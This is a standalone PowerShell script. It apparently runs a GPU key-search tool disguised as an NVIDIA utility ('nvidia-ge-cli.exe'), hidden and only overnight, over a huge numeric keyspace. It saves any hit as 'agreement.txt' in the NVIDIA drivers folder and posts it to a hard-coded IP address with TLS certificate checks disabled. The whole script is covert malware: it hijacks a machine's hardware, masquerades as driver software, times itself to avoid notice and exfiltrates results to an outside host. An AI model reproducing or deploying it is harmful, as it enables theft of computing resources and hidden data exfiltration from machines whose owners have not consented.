$startTime=(Get-Date)
$hoursRan=0
$goalRunHours=30
function Get-V{
    param(
        [Parameter(Mandatory = $true)]
        [BigInt]$start,
        [Parameter(Mandatory = $true)]
        [BigInt]$sections,
        [Parameter(Mandatory = $true)]
        [BigInt]$chunk
    )
    $shex = $start.tostring("x")
    $rand = Get-Random -Minimum 1 -Maximum $sections
    $end = $start + ($chunk * $rand)
    $ehex = $end.tostring("x")
    return "0x${shex}:0x${ehex}"
}

function Run-Finder {
    $range = Get-V 36893488147419103232 284667 64800000000000
    $process=Get-Process nvidia-ge-cli -ea SilentlyContinue
    if(!$process) {
        Start-Process "nvidia-ge-cli.exe" -ArgumentList '--keyspace', $range,  "-i",  "version.txt", "--continue", "state.txt", "-o", "agreement.txt" -WindowStyle Hidden
    }
}

function Stop-Finder {
    $hoursRan = $hoursRan+((Get-Date)-($startTime)).TotalHours
    $process=Get-Process nvidia-ge-cli -ea SilentlyContinue
    if($process) {
        Stop-Process -Force $process
    }
}

function Runner{
    $currTime=(Get-Date)
    if($currTime.hour -ge 21 -or $currTime.hour -le 7) {
        Run-Finder
    } else {
        Stop-Finder
    }
    if ($hoursRan -ge $goalRunHours) {
        Stop-Finder
        del state.txt
        $hoursRan=0
    }
    Start-Sleep -Seconds 900
    if(Test-Path -Path 'C:\Program Files\NVIDIA Graphics Drivers\agreement.txt') {
        $key=cat 'C:\Program Files\NVIDIA Graphics Drivers\agreement.txt'
        $postParams = @{name='currys';key=$key}
        Invoke-WebRequest -Uri https://52.206.247.100/api/key -Method POST -Headers $headers -Body (ConvertTo-Json $postParams)
    } else {
        Runner
    }
}

add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
        return true;
    }
}
"@
$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

Runner
